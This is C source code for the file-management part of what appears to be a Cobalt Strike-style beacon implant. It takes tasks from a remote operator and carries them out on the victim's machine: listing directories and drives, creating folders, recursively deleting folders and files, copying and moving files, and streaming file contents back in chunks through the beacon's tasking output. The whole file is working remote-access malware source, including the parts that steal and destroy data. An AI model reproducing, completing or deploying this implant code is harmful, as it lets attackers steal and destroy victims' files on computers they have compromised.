#include "BeaconFileManage.h"

void BeaconLs(char* Taskdata, int Task_size)
{
	SYSTEMTIME SystemTime;
	SYSTEMTIME LocalTime;
	HANDLE FirstFileA;

	char* buff = (char*)malloc(0x4000);
	memset(buff, 0, 0x4000u);
	datap taskpdatap;
	BeaconDataParse(&taskpdatap, Taskdata, Task_size);
	int unknown = BeaconDataInt(&taskpdatap);
	BeaconDataCopyToBuffer(&taskpdatap, buff, 0x4000);
	formatp pdatap;
	BeaconFormatAlloc((formatp*)&pdatap, 0x200000u);
	BeaconFormatInt((formatp*)&pdatap, unknown);
	if (!strncmp(buff, ".\\*", 0x4000))
	{
		GetCurrentDirectoryA(0x4000u, buff);
		strncat_s(buff, 0x4000u, "\\*", 2);
	}
	BeaconFormatPrintf((formatp*)&pdatap, (char*)"%s\n", buff);
	WIN32_FIND_DATAA FindFileData;
	FirstFileA = FindFirstFileA(buff, &FindFileData);
	if (FirstFileA == (HANDLE)-1)
	{
		BeaconTaskError1Output(52, GetLastError(), buff);
		int length = BeaconFormatlength((formatp*)&pdatap);
		char* buffer = BeaconFormatOriginalPtr((formatp*)&pdatap);
		BeaconTaskOutput(buffer, length, 22);
		free(buff);
	}
	else
	{
		free(buff);
		do
		{
			FileTimeToSystemTime(&FindFileData.ftLastWriteTime, &SystemTime);
			SystemTimeToTzSpecificLocalTime(0, &SystemTime, &LocalTime);
			if ((FindFileData.dwFileAttributes & 0x10) != 0)
			{
				BeaconFormatPrintf(
					(formatp*)&pdatap,
					(char*)"D\t0\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
					LocalTime.wMonth,
					LocalTime.wDay,
					LocalTime.wYear,
					LocalTime.wHour,
					LocalTime.wMinute,
					LocalTime.wSecond,
					FindFileData.cFileName);
			}
			else
			{
				BeaconFormatPrintf(
					(formatp*)&pdatap,
					(char*)"F\t%I64d\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
					__PAIR64__(FindFileData.nFileSizeHigh, FindFileData.nFileSizeLow),
					LocalTime.wMonth,
					LocalTime.wDay,
					LocalTime.wYear,
					LocalTime.wHour,
					LocalTime.wMinute,
					LocalTime.wSecond,
					FindFileData.cFileName);
			}
		} while (FindNextFileA(FirstFileA, &FindFileData));
		FindClose(FirstFileA);
		int length = BeaconFormatlength((formatp*)&pdatap);
		char* buffer = BeaconFormatOriginalPtr((formatp*)&pdatap);
		BeaconTaskOutput(buffer, length, 0x16u);
	}
	BeaconFormatFree((formatp*)&pdatap);
}


void beacon_MkDir(char* Taskdata, int Task_size)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	char* buffer = (char*)malloc(0x4000u);
	BeaconDataCopyNToBuffer(&pdatap, buffer, 0x4000);
	_mkdir(buffer);
	free(buffer);
}

void GetDrivesList(char* Taskdata, int Task_size)
{

	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int unknown = BeaconDataInt(&pdatap);

	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 0x80u);
	BeaconFormatInt(&pformatp, unknown);
	DWORD LogicalDrives = GetLogicalDrives();
	BeaconFormatPrintf(&pformatp, (char*)"%u", LogicalDrives);
	int length = BeaconFormatlength(&pformatp);
	char* buffer = BeaconFormatOriginalPtr(&pformatp);
	BeaconTaskOutput(buffer, length, 22);
	BeaconFormatFree(&pformatp);
}


BOOL isDirectory(LPCSTR lpFileName)
{
	return (GetFileAttributesA(lpFileName) & FILE_ATTRIBUTE_DIRECTORY) == 16;
}

void __cdecl CallbackDelFile(const char* path, const char* name, int type)
{
	char* buffer = (char*)malloc(0x4000u);
	memset(buffer, 0, 0x4000);
	_snprintf(buffer, 0x4000u, "%s\\%s", path, name);
	if (type)
	{
		_rmdir(buffer);
	}
	else
	{
		remove(buffer);
	}
	free(buffer);
}

void DeleteAllFile(char* buffer)
{
	struct _WIN32_FIND_DATAA FindFileData;

	TraverseDeleteFile(buffer, &FindFileData, CallbackDelFile);
}



void TraverseDeleteFile(char* path, LPWIN32_FIND_DATAA lpFindFileData, CallbackDelFilePtr Callback_fun)
{
	char* buffer = (char*)malloc(0x8000u);
	_snprintf(buffer, 0x8000u, "%s\\*", path);
	HANDLE hFindFile = FindFirstFileA(buffer, lpFindFileData);
	free(buffer);
	if (hFindFile != (HANDLE)-1)
	{
		do
		{
			if ((lpFindFileData->dwFileAttributes & 0x10) != 0)
			{
				if (strcmp(lpFindFileData->cFileName, "."))
				{
					if (strcmp(lpFindFileData->cFileName, ".."))
					{
						char* temp = (char*)malloc(0x8000u);
						_snprintf(temp, 0x8000u, "%s", lpFindFileData->cFileName);
						RecursionTraverseDeleteFile(path, lpFindFileData->cFileName, lpFindFileData, Callback_fun);
						Callback_fun(path, temp, 1);
						free(temp);
					}
				}
			}
			else
			{
				Callback_fun(path, lpFindFileData->cFileName, 0);
			}
		} while (FindNextFileA(hFindFile, lpFindFileData));
		FindClose(hFindFile);
	}
}
void RecursionTraverseDeleteFile(char* path, char* Name, LPWIN32_FIND_DATAA lpFindFileData, CallbackDelFilePtr Callback)
{
	char* buffer = (char*)malloc(0x8000u);
	_snprintf(buffer, 0x8000u, "%s\\%s", path, Name);
	TraverseDeleteFile(buffer, lpFindFileData, Callback);
	free(buffer);
}
void beacon_rm(char* Taskdata, int Task_size)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	char* buffer = (char*)malloc(0x4000u);
	BeaconDataCopyNToBuffer(&pdatap, buffer, 0x4000);
	if (isDirectory(buffer))
	{
		DeleteAllFile(buffer);
		_rmdir(buffer);
	}
	else
	{
		remove(buffer);
	}
	free(buffer);
}

void beacon_copy(char* Taskdata, int Task_size)
{

	datap* pdatap = BeaconDataInit(0x4000u);
	char* lpExistingFileName = BeaconDataPtr(pdatap, 0x2000);
	char* lpNewFileName = BeaconDataPtr(pdatap, 0x2000);

	datap ptaskdatap;
	BeaconDataParse(&ptaskdatap, Taskdata, Task_size);
	BeaconDataCopyToBuffer(&ptaskdatap, lpExistingFileName, 0x2000);
	BeaconDataCopyToBuffer(&ptaskdatap,lpNewFileName, 0x2000);
	if (!CopyFileA(lpExistingFileName, lpNewFileName, 0))
	{
		BeaconErrorD(0xDu, GetLastError());
	}
	BeaconDataClear(pdatap);
	BeaconDataFree(pdatap);
}

void beacon_Move(char* Taskdata, int Task_size)
{

	datap* pdatap = BeaconDataInit(0x4000u);
	char* lpExistingFileName = BeaconDataPtr(pdatap, 0x2000);
	char* lpNewFileName = BeaconDataPtr(pdatap, 0x2000);

	datap ptaskdatap;
	BeaconDataParse(&ptaskdatap, Taskdata, Task_size);
	BeaconDataCopyToBuffer(&ptaskdatap, lpExistingFileName, 0x2000);
	BeaconDataCopyToBuffer(&ptaskdatap, lpNewFileName, 0x2000);
	if (!MoveFileA(lpExistingFileName, lpNewFileName))
	{
		BeaconErrorD(0xEu, GetLastError());
	}
	BeaconDataClear(pdatap);
	BeaconDataFree(pdatap);
}
void CheckDownloadIsOK(BeaconDownload* pBeaconDownload)
{
	if (!pBeaconDownload->size)
	{
		int number = htonl(pBeaconDownload->number);
		BeaconTaskOutput((char*)&number, 4, 9);
		fclose(pBeaconDownload->fp);
	}
}
char* download_data;
void TransferFileData(BeaconDownload* pBeaconDownload, size_t size)
{

	if (!download_data)
	{
		download_data = (char*)malloc(0x80004u);
	}
	*(int*)download_data = htonl(pBeaconDownload->number);
	int dsize = pBeaconDownload->size;
	if (dsize > size)
	{
		dsize = size;
	}
	int readsize =0;
	while (dsize)
	{
		int readlen = fread(&download_data[readsize + 4], 1u, dsize, pBeaconDownload->fp);
		if (!readlen)
		{
			pBeaconDownload->size = 0;
			break;
		}
		readsize += readlen;
		dsize -= readlen;
		pBeaconDownload->size -= readlen;
	}
	BeaconTaskOutput(download_data, readsize + 4, 8);  // ÎÄ¼şÏÂÔØ
	CheckDownloadIsOK(pBeaconDownload);
}

void __cdecl CheckDownload(size_t size)
{

	BeaconDownload* pgBeaconDownload = gBeaconDownload;
	if (pgBeaconDownload)
	{
		do
		{
			if (pgBeaconDownload->size)
			{
				TransferFileData(pgBeaconDownload, size);
			}
			pgBeaconDownload = pgBeaconDownload->Linked;
		} while (pgBeaconDownload);

		pgBeaconDownload = gBeaconDownload;
		BeaconDownload* temp=0;
		while (pgBeaconDownload)
		{
			if (pgBeaconDownload->size)
			{
				temp = pgBeaconDownload;
				pgBeaconDownload = pgBeaconDownload->Linked;
			}
			else
			{
				if (!temp)
				{
					gBeaconDownload = pgBeaconDownload->Linked;
					free(pgBeaconDownload);
					return;
				}
				temp->Linked = pgBeaconDownload->Linked;
				free(pgBeaconDownload);
				pgBeaconDownload = temp->Linked;
			}
		}
	}
}